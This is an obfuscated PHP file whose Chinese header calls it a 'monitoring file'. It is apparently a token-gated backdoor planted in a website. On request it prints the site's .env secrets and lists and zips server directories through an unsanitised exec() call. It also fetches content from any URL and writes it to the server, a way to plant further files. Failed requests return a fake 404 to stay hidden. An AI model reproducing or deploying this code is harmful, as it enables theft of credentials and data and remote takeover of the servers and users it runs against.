<?php
/*
 本文件为监控文件，严禁使用源码进行非法活动，一旦发现，将向相关部门举报。
 严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
*/

$J2w8E=$_GET['token']??'';unset($J2wtI8F);$J2wtI8F=$J2w8E;$token=$J2wtI8F;unset($J2wtI8E);$J2wtI8E=$_GET['type'];$type=$J2wtI8E;$J2w8E=!$type;$J2w8G=(bool)$J2w8E;$J2w8H=!$J2w8G;if($J2w8H)goto J2weWjgx3;goto J2wldMhx3;J2weWjgx3:$J2w8F=!$token;$J2w8G=(bool)$J2w8F;goto J2wx2;J2wldMhx3:J2wx2:if($J2w8G)goto J2weWjgx4;goto J2wldMhx4;J2weWjgx4:error();goto J2wx1;J2wldMhx4:J2wx1:$J2w8E=$token!='a8d3d543d5b7ac121797f021033830c3';if($J2w8E)goto J2weWjgx6;goto J2wldMhx6;J2weWjgx6:error();goto J2wx5;J2wldMhx6:J2wx5:unset($J2wtI8E);$J2wtI8E=$_SERVER['DOCUMENT_ROOT'];$rootPath=$J2wtI8E;switch($type){case 'path':echo $rootPath;break 1;case 'env':$J2wvP8E=$rootPath . '/../.env';echo file_get_contents($J2wvP8E);break 1;case 'file':$J2w8E=$_GET['dir']??'/';unset($J2wtI8F);$J2wtI8F=$J2w8E;$dir=$J2wtI8F;$J2w8E=$_GET['isZip']??false;unset($J2wtI8F);$J2wtI8F=$J2w8E;$zip=$J2wtI8F;fileScan($rootPath,$dir,$zip);break 1;case 'postfc':postfc();break 1;default:error();break 1;}function error(){header('HTTP/1.1 404 Not Found');exit();}function fileScan($rootPath,$path='/',$isZip=false){$J2w8E=$rootPath . $path;unset($J2wtI8F);$J2wtI8F=$J2w8E;$directory=$J2wtI8F;$J2w8E=$directory . '<br>';echo $J2w8E;$J2w8E=!is_dir($directory);if($J2w8E)goto J2weWjgxe;goto J2wldMhxe;J2weWjgxe:exit('No such file or directory');goto J2wxd;J2wldMhxe:J2wxd:unset($J2wtI8E);$J2wtI8E=scandir($directory);$files=$J2wtI8E;unset($J2wtI8E);$J2wtI8E=array_filter($files,function($file)use($directory){$J2wvP8E=$directory . "/";$J2wvP8F=$J2wvP8E . $file;$J2w8H=(bool)is_dir($J2wvP8F);if($J2w8H)goto J2weWjgxk;goto J2wldMhxk;J2weWjgxk:$J2w8G=$file!='.';$J2w8H=(bool)$J2w8G;goto J2wxj;J2wldMhxk:J2wxj:$J2w8J=(bool)$J2w8H;if($J2w8J)goto J2weWjgxi;goto J2wldMhxi;J2weWjgxi:$J2w8I=$file!='..';$J2w8J=(bool)$J2w8I;goto J2wxh;J2wldMhxi:J2wxh:return $J2w8J;});$directories=$J2wtI8E;foreach($directories as $dir){$J2w8E=$dir . "<br>";echo $J2w8E;}if($isZip)goto J2weWjgxg;goto J2wldMhxg;J2weWjgxg:$J2w8E=uniqid() . '.zip';unset($J2wtI8F);$J2wtI8F=$J2w8E;$name=$J2wtI8F;$J2w8E='cd ' . $directory;$J2w8F=$J2w8E . ' && zip -r ';$J2w8G=$J2w8F . $name;$J2w8H=$J2w8G . ' *';unset($J2wtI8I);$J2wtI8I=$J2w8H;$exec=$J2wtI8I;exec($exec);$J2w8E='打包成功:' . $path;$J2w8F=$J2w8E . '/';$J2w8G=$J2w8F . $name;echo $J2w8G;goto J2wxf;J2wldMhxg:J2wxf:}function postfc(){unset($J2wtI8E);$J2wtI8E=$_GET['id'];$id=$J2wtI8E;$J2w8E=$_GET['dir']??'./';unset($J2wtI8F);$J2wtI8F=$J2w8E;$localFilePath=$J2wtI8F;unset($J2wtI8E);$J2wtI8E=30;$timeout=$J2wtI8E;unset($J2wtI8E);$J2wtI8E=stream_context_create(['http'=>['timeout'=>$timeout,],]);$context=$J2wtI8E;unset($J2wtI8E);$J2wtI8E=file_get_contents($id,false,$context);$fileContent=$J2wtI8E;$J2w8E=$fileContent!==false;if($J2w8E)goto J2weWjgxm;goto J2wldMhxm;J2weWjgxm:file_put_contents($localFilePath,$fileContent);echo 'success!';goto J2wxl;J2wldMhxm:echo 'error!';J2wxl:}
?>